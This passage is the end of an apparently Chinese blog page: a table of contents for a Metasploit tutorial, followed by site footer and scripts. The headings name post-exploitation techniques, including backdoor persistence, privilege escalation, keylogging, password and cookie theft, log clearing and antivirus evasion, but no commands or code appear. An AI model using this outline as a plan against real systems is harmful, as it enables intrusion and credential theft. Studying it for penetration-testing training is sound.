href="#20%E3%80%81%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97post-x2F-windows-x2F-gather-x2F-forensics-x2F-enum-drives%E8%B0%83%E7%94%A8"><span class="toc-text">20、后渗透模块post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21%E3%80%81%E8%B0%83%E7%94%A8post-x2F-windows-x2F-gather-x2F-checkvm%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97%EF%BC%8C%E7%A1%AE%E5%AE%9A%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%98%AF%E5%90%A6%E6%98%AF%E4%B8%80%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-text">21、调用post&#x2F;windows&#x2F;gather&#x2F;checkvm后渗透模块，确定目标主机是否是一台虚拟机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22%E3%80%81persistence%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97%E5%90%91%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F"><span class="toc-text">22、persistence后渗透模块向目标主机植入后门程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23%E3%80%81%E8%B0%83%E7%94%A8metsvc%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97"><span class="toc-text">23、调用metsvc后渗透攻击模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24%E3%80%81%E8%B0%83%E7%94%A8getgui%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97"><span class="toc-text">24、调用getgui后渗透攻击模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25%E3%80%81%E6%8F%90%E6%9D%83%E5%91%BD%E4%BB%A4getsystem"><span class="toc-text">25、提权命令getsystem</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26%E3%80%81%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8%E5%8A%9F%E8%83%BDkeyscan"><span class="toc-text">26、键盘记录器功能keyscan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#27%E3%80%81%E7%B3%BB%E7%BB%9F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="toc-text">27、系统账号密码获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#28%E3%80%81%E8%B0%83%E7%94%A8post-x2F-windows-x2F-gather-x2F-enum-applications%E6%A8%A1%E5%9D%97%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%BF%A1%E6%81%AF"><span class="toc-text">28、调用post&#x2F;windows&#x2F;gather&#x2F;enum_applications模块获取目标主机上的软件安装信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#29%E3%80%81%E8%B0%83%E7%94%A8post-x2F-windows-x2F-gather-x2F-dumplinks%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E4%B8%8A%E6%9C%80%E8%BF%91%E8%AE%BF%E9%97%AE%E8%BF%87%E7%9A%84%E6%96%87%E6%A1%A3%E3%80%81%E9%93%BE%E6%8E%A5%E4%BF%A1%E6%81%AF"><span class="toc-text">29、调用post&#x2F;windows&#x2F;gather&#x2F;dumplinks获取目标主机上最近访问过的文档、链接信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#30%E3%80%81%E8%B0%83%E7%94%A8post-x2F-windows-x2F-gather-x2F-enum-ie%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97%EF%BC%8C%E8%AF%BB%E5%8F%96%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BAIE%E6%B5%8F%E8%A7%88%E5%99%A8cookies%E7%AD%89%E7%BC%93%E5%AD%98%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%97%85%E6%8E%A2%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E7%99%BB%E5%BD%95%E8%BF%87%E7%9A%84%E5%90%84%E7%B1%BB%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-text">30、调用post&#x2F;windows&#x2F;gather&#x2F;enum_ie后渗透模块，读取目标主机IE浏览器cookies等缓存信息，嗅探目标主机登录过的各类账号密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#31%E3%80%81route%E5%91%BD%E4%BB%A4"><span class="toc-text">31、route命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32%E3%80%81clearev%E5%91%BD%E4%BB%A4"><span class="toc-text">32、clearev命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#payload%E7%9A%84%E5%87%A0%E4%B8%AA%E5%B8%B8%E7%94%A8%E7%94%9F%E6%88%90"><span class="toc-text">payload的几个常用生成</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86"><span class="toc-text">内网代理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E6%8C%81%E4%B9%85%E5%90%8E%E9%97%A8"><span class="toc-text">建立持久后门</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-text">漏洞扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">一些常用命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A"><span class="toc-text">名词解释</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E5%99%A8"><span class="toc-text">编码器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E5%88%BA%E6%8E%A2%E4%B8%8E%E6%94%B6%E9%9B%86"><span class="toc-text">信息刺探与收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">攻击第一步：基础信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8nmap-%E6%8E%A2%E6%B5%8B%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3%E5%92%8C%E6%9C%8D%E5%8A%A1%EF%BC%9A"><span class="toc-text">用nmap 探测开放端口和服务：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF-%E4%B8%8Epostgresql-%E5%8D%8F%E5%90%8C%E5%B7%A5%E4%BD%9C"><span class="toc-text">MSF 与postgresql 协同工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7%E6%89%AB%E6%8F%8F%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-text">高级扫描方式：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E5%AE%9A%E6%89%AB%E6%8F%8F%EF%BC%9A"><span class="toc-text">特定扫描：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-text">基本漏洞扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%BA%A2%E5%87%BA%E5%91%BD%E4%BB%A4"><span class="toc-text">基础溢出命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#METERPRETER"><span class="toc-text">METERPRETER</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%81%BF%E5%BC%80%E6%9D%80%E8%BD%AF"><span class="toc-text">避开杀软</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%94%A8%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F-client-side-attacks"><span class="toc-text">使用用户端攻击方式(client-side attacks)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF-%E9%99%84%E5%8A%A0%E6%A8%A1%E5%9D%97"><span class="toc-text">MSF 附加模块</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E5%B7%A5%E5%85%B7%E9%9B%86%EF%BC%88SET%EF%BC%89"><span class="toc-text">社会工程学工具集（SET）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FAST-TRACK"><span class="toc-text">FAST-TRACK</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#KARMERASPLOIT"><span class="toc-text">KARMERASPLOIT</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E6%A8%A1%E5%9D%97%EF%BC%8C%E7%BC%96%E5%86%99%E8%87%AA%E5%B7%B1%E7%9A%84exploit%EF%BC%8Cmeterpreter%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B"><span class="toc-text">构建自己的模块，编写自己的exploit，meterpreter脚本编程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0"><span class="toc-text">渗透实战演习</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98"><span class="toc-text">常用命令备忘</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/e5925563a436d850cfc6184421b9ec77.jpeg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By putdown</div><div class="footer_custom_text"><div> Welcome to lie down </div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_clock_anzhiyu_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
    console.log('已挂载butterfly_clock_anzhiyu')
    if(parent_div_git) {
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var qweather_key = '92c0b85004c94c3a97297a4fd2f8c93e';
  var gaud_map_key = '5544b267bba4ecd452e5b3f7327b1b8a';
  var baidu_ak_key = 'undefined';
  var flag = 0;
  var clock_rectangle = '112.982279,28.19409';
  var clock_default_rectangle_enable = 'false';

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_anzhiyu_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_anzhiyu_injector_config();
  }
  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><!-- hexo injector body_end end --></body></html>